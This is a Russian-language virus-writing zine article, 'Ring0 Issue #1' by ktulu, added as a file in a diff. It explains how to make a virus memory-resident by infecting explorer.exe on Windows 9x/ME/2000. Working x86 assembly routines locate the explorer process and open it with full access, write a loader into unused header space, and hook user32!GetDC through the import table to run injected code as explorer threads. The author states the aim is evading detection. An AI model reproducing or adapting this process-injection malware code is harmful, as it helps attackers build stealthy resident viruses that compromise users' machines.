@@ -1,0 +1,303 @@
+
+ /*-----------------------------------------------------------------------*/
+ /*                       R I N G 0,    I S S U E   # 1                   */
+ /*-----------------------------------------------------------------------*/
+
+                     Заражение эксплорера в памяти
+
+                                                             by ktulu
+
+Hello, comrades.
+
+     Совершенно  очевидно,  что  писать обычный файловый вирус (трипак),
+который  пассивно  распространяется,  в  наше  время  бесполезно. Любому
+in-the-wild  вирусу необходима резидентность.Поэтому просто удивительно,
+сколько пишется per-process резидентов. Но ситуация меняется к лучшему.
+
+     Вообще  есть несколько разных способов резидентности, я расскажу об
+резидентности,  через  заражение  эксплорера в памяти. Собственно, такая
+идея  у  меня  возникла  после  прочтения  статьи  griyo/29a и ковыряния
+magistr'а.   Посмотрев   оба  способа,  я  решил  что  возможно  создать
+универсальный  win9x/ME/2k  explorer infector. Что из этого получилось -
+хз :), читайте в конце статьи.
+
+     Нашей  задачей  будет  запуск  в процессе explorer.exe нашего кода,
+который  потом  уже  сможет  запустить  вирус отдельной нитью (thread) в
+эксплорере.  Преимущества  этого  метода  резидентности  очевидны: вирус
+висит не отдельным процессом, а одной или несколькими нитями эксплорера,
+соответственно обнаружить его будет сложнее.
+
+     Теперь как это сделать. На самом деле все просто, нам нужно:
+1. найти эксплорер
+2. открыть его с правами на чтение/запись итд
+3. найти в нем неиспользуемое место
+4. записать туда наш loader
+5. перенаправить какую-нибудь часто вызываемую апи на loader
+6. после того, как loader получит управление, подгрузить основной
+вирусный код и запустить его отдельной нитью (уже в эксплорере).
+
+     После этого уже можно делать все что угодно. Значит, поехали:
+     1.  тут  нам необходимо получить не только хендл на эксплорер, но и
+его  imagebase,  чтобы  знать потом куда писать. Хендл мне кажется проще
+всего  получить,  найдя  какое-нибудь окно эксплорера и воспользовавшись
+GetWindowThreadProcessId и OpenProcess. Вот так:
+;-----------------------------------------------------------------------------
+     Прим:  весь  код  который  здесь  приводится  приближен к реальному
+вирусу.   Поэтому  кое-какие  внешние  процедуры  отсутствуют.  Если  не
+понятно,   что   какая-то   процедура   или  макрос  делают,  посмотрите
+прилагающиеся сорцы.
+;-----------------------------------------------------------------------------
+;find explorer
+;in:    none
+;out:   EAX     explorer handle
+findexpl:
+        pusha
+
+        push 'd'
+        push 'nWya'
+        push 'rT_l'
+        push 'lehS' ;Shell_TrayWnd
+        mov eax, esp
+        push 0
+        push eax
+        _call FindWindowA ;находим окно
+        add esp, 16
+
+        push eax
+        push esp
+        push eax
+        _call GetWindowThreadProcessId ;находим ProcessId эксплорера
+        test eax, eax
+        jz fatal_error
+
+        push 0
+        push PROCESS_ALL_ACCESS
+        _call OpenProcess ;открываем его
+        test eax, eax
+        je fatal_error
+
+        mov [esp+7*4], eax
+        popa
+        retn
+;-----------------------------------------------------------------------------
+     Imagebase  можно  получить  кучей  разных  способов, но проще всего
+оказалось  прочитав  это  в  его  PE  headerе. Почему бы просто не взять
+400000h? А потому что под, например, winnt 4.0 imagebase уже другой.
+;-----------------------------------------------------------------------------
+find_imagebase:
+;in: ebx - explorer handle
+;    edi - temp buffer
+        pusha
+        push 100
+        push edi
+        _call GetWindowsDirectoryA
+
+        xor ecx, ecx
+        dec ecx
+        push edi
+        xor eax, eax
+        repnz scasb
+        dec edi
+        mov eax, 'pxe\'
+        stosd
+        mov eax, 'erol'
+        stosd
+        mov eax, 'xe.r'
+        stosd
+        mov word ptr [edi], 'e' ;explorer.exe, 0
+
+        pop ebx
+        mov edx, ebx
+
+        call fopen
+
+        mov esi, mz_size
+        mov edi, edx
+        call fread
+
+        mov eax, [edx].mz_neptr
+        call fseekBeg
+
+        add edx, mz_size
+        mov esi, pe_size
+        mov edi, edx
+        call fread
+        call fclose
+
+        mov eax, [edx].pe_imagebase
+        mov [esp+7*4], eax
+        popa
+        retn
+;-----------------------------------------------------------------------------
+     Затем, после того, как мы нашли эксплорер, надо записать в него наш
+загрузчик.   Тут   возникает   вопрос:   куда  записывать.  Я  предлагаю
+записываться  в  свободное  место между хедером и первой секцией. Плюсы:
+места  там  предостаточно,  и  гарантированно  не  потрем что-то нужное.
+Минусы:  на  эти  страницы  стоит  PAGE_READWRITE, так что если мы хотим
+сделать  самомодифичирующийся загрузчик (а нам придется это сделать), то
+надо  будет  сделать лишний вызов VirtualProtect _memread и _memwrite, к
+которым я здесь обращаюсь на входе имеют
+;esi - size
+;edi - buffer (для чтения/записи)
+;ebx - handle
+;ecx - rva
+опять же смотрите сорцы.
+;------------------------------------------------------------------------------
+;inject code to explorer.exe
+;in:    edx             указатель на temp буфеp
+;       edi             headerz
+;       ebx             хендл explorer.exe
+;       eax             указатель на injected code
+;out:   eax             rva injected code в контексте explorer.exe
+
+inj_code:
+        pusha
+        xchg edi, edx
+        movzx ecx, [edx+mz_size].pe_ntheadersize
+        add ecx, [edx].mz_neptr
+        add ecx, 18h
+        mov esi, 28h
+        call _memread ;ищем куда бы записаться
+
+        mov ecx, [edi].oe_virt_rva ;проверяем пусто ли там
+        mov esi, inject_len
+                 ;кстати это же служит проверкой на резидентность
+        sub ecx, esi
+        push ecx
+        call _memread
+
+        push eax
+        xor eax, eax
+        mov ecx, esi
+        rep scasb
+        jnz fatal_error
+        pop eax
+        pop ecx
+
+        pusha ;ставим на эти страницы PAGE_READWRITE
+        push eax
+        push esp
+        push PAGE_READWRITE
+        push esi
+        add ecx, [ebp+(_addimagebase-vstart)] ;найденная imagebase
+        push ecx
+        push ebx
+        _call VirtualProtectEx
+        test eax, eax
+        jz fatal_error
+        pop eax
+        popa
+
+        mov edi, eax  ;пишем себя
+        call _memwrite
+
+        add ecx, [ebp+(_addimagebase-vstart)]
+        mov [esp+7*4], ecx
+        popa
+        retn
+;------------------------------------------------------------------------------
+     Итак,  если  все  прошло успешно, то наш код уже на месте. Осталось
+только  заставить  эксплорер  передать  туда управление, а там уже все в
+наших   руках.   Самый   простой  способ  это  сделать  -  перенаправить
+какую-нибудь  api  на наш loader GriYo предложил перехватывать GetDC и я
+сделаю  также,  хотя на мой взгляд в реальном вирусе удобнее перехватить
+какую-нибудь  GetDlgCtrlID.  Но на самом деле это не так важно. Тут есть
+еще  одно  обстоятельство,  которое надо учитывать. В nt/2k у эксплорера
+IAT  уже  заполнен  адресами  импортируемых  ф-ций, а сам IAT защищен от
+записи.  В том числе и из-за этого код griyo не будет работать на 2к/nt.
+Здесь  я  перехватываю  GetDC  "честно"  разбирая  import table, хотя на
+практике наверное будет удобнее найти ее поиском по адресу в IAT.
+;------------------------------------------------------------------------------
+;Hook explorer user32!GetDC
+;in:    edx             указатель на temp буфеp
+;       eax             новое значение точки входа user32!GetDC
+;       edi             pe header
+;       ebx             хендл explorer.exe
+;out:   eax             указатель на user32!GetDC import entry
+hook_expl:
+        pusha
+        push eax
+        xchg edx, edi
+        mov ecx, [edx].pe_importtablerva
+        mov esi, [edx].pe_importtablesize ;находим import table
+        call _memread
+        mov eax, edi
+
+__verr_lib:
+        mov esi, [edi].im_librarynamerva ;находим entry для USER32.DLL
+        sub esi, ecx
+        cmp dword ptr [eax+esi], 'RESU'
+        je __user32_found
+        add edi, im_size
+        jmp __verr_lib
+
+__user32_found:
+; read user32 import table entry
+        xchg eax, edi
+        add edi, [edx].pe_importtablesize
+        mov esi, 200h
+        mov ecx, [eax].im_lookuptablerva
+        call _memread
+
+        push eax
+        mov edx, edi ;находим GetDC
+        add edi, esi
+        mov esi, 7
+        xor eax, eax
+__next_func:
+        mov ecx, [edx+eax*4]
+        call _memread
+        push eax
+        mov eax, dword ptr [edi+2] ;GetDC
+        xor eax, dword ptr [edi+3]
+        cmp eax, 'DteG' xor 'CDte'
+        pop eax
+        je __GetDC_found
+        inc eax
+        jmp __next_func
+
+__GetDC_found:
+;read user32 IAT GetDC entry
+        pop edx
+        push 4
+        pop esi
+        shl eax, 2
+        xchg eax, ecx
+        add ecx, [edx].im_addresstablerva
+        call _memread
+
+        mov edi, esp
+        call _memwrite
+        pop eax
+        mov [esp+7*4], ecx
+        popa
+        retn
+;------------------------------------------------------------------------------
+     Итак,  мы  перехватили  user32!GetDC и через какое-то время наш код
+получит  управление.  Осталось  только  получить  доступ к программе, из
+которой  делался перехват. Это опять же можно сделать разными способами,
+но            самый           простой           -           использовать
+CreateFileMappingA/OpenFileMappingA/MapViewOfFile.    Это    стандартная
+техника  под  виндой, так что описывать ее я не буду. Если не знаете, то
+смотрите   сорцы.   А  вообще  про  IPC  (inter  process  communication)
+написано очень много, в том числе и в vx журналах.
+
+     Что делать после того, как получили доступ? Да все что угодно - это
+уже вам решать. Самое логичное - запустить в эксплорере отдельную нитку.
+Или,  если  очень  надо подальше спрятаться, делать свои дела при каждом
+запуске api. Вариантов много.
+
+     Теперь  о  том  где  и  как все это тестилось. Я тестил этот код на
+win98se,  winme,  win2kpro  sp1  и везде все было нормально. Однако есть
+сведения  о  глюках  на  win95osr2, и что самое печальное win2k advanced
+server.  Однако,  я  уверен,  что  дело тут в ошибках в самом коде, а не
+принципе. Если кто-то сможет протестировать и выяснить в чем проблема, а
+тем более исправить недоделки, то пишите на _asdfgh@rambler.ru.
+
+     btw,    я    написал   стабильный   вариант,   который   использует
+CreateRemoteThread. К сожалению, такая api присутствует только на nt/2k.
+Использовав  небольшой  трюк,  можно  "добавить  поддержку"  и winme, но
+остается win98, которая стоит на большинстве машин.
+
+                                                ...the call of ktulu...
+
